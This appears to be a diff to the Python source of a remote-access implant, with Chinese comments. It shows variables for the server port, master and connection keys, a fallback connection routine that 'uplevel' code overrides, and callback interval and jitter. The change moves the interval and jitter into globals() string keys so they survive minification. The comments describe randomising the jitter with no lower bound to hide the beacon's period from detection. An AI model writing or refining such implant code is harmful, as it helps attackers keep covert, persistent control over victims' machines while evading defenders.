@@ -20,8 +20,10 @@ _P = PORT                 # server 端口(set_host 模块修改,connect_transpor
 _K = MASTER_KEY           # 部署密钥(set_key 模块修改)
 _CK = MASTER_KEY          # 当前连接密钥(uplevel _disp 按通道层切换;cycle 每轮 CONN_KEY=_CK)
 _B = BREAK_FLAG           # break 标志(主循环检查 _B)
-_I = INTERVAL             # 回连间隔(set_interval 模块修改,sleep_jitter 读取)
-_J = JITTER               # 回连抖动(set_interval 模块修改,sleep_jitter 读取)
+# 回连间隔/抖动用 globals() 字符串键存储: set_interval 模块与 sleep_jitter
+# 各自 minify 后短名不一致, 字符串键 "_I"/"_J" 不受压缩影响(跨文件唯一通道)
+globals()["_I"] = INTERVAL
+globals()["_J"] = JITTER
 
 def _T():
     """连接函数(uplevel 升级代码覆盖 _T 实现多级回退通道)。"""
@@ -219,7 +221,9 @@ def _handle_tasks(msg):
 
 def sleep_jitter():
     # 回连间隔(混淆): [0.75I, 1.5I] 均匀随机,无最短下限(原 max(5,±) 有周期下界)
-    return rnd.uniform(_I * 0.75, _I * 1.5)
+    # 读 globals() 字符串键(set_interval 模块写入, minify 安全)
+    return rnd.uniform(globals().get("_I", INTERVAL) * 0.75,
+                       globals().get("_I", INTERVAL) * 1.5)
 
 def cycle():
     global CONN_KEY
